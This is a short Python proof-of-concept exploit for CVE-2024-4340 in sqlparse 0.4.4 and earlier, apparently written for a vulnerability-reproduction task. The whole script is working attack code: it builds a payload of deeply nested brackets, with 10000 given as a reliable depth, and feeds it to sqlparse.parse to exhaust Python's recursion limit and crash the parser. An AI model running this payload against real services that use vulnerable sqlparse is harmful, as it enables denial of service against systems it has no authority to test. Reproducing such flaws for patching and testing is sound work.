#!/usr/bin/env python3
"""
PoC for CVE-2024-4340 (sqlparse ≤ 0.4.4)

INPUT FORMAT:
    One command-line argument: an integer DEPTH ≥ 1.
    The payload string will consist of DEPTH '[' characters followed by DEPTH ']' characters.

SPECIFIC INPUT THAT TRIGGERS THE VULNERABILITY:
    Any large value such as 10000 reliably exceeds Python’s recursion limit in the vulnerable code.

Example:
    python3 exploit.py 10000
"""
import sys
import sqlparse


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <depth>")
        sys.exit(1)
    try:
        depth = int(sys.argv[1])
        if depth <= 0:
            raise ValueError
    except ValueError:
        print("<depth> must be a positive integer")
        sys.exit(1)

    payload = '[' * depth + ']' * depth
    # Trigger the uncontrolled recursion vulnerability
    sqlparse.parse(payload)


if __name__ == "__main__":
    main()